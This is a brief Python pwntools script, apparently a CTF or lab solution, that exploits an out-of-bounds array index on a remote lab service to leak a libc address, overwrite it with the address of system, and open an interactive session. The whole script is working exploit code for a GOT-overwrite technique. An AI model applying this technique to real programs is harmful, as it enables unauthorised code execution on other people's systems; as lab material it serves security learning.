from pwn import *

# r = process("./lab")
r = remote("10.113.184.121", 10043)

r.recvuntil(b"idx: ")
r.sendline(b"-5")
got = r.recvline() # b"arr[-5] = 140709374052080\n"

# extract the address in got
got = int(got.split(b" ")[-1].strip())

# calculate got - printf + system
got = got - 223536 + 159664

r.recvuntil(b"val: ")
r.sendline(str(got).encode())

r.interactive()
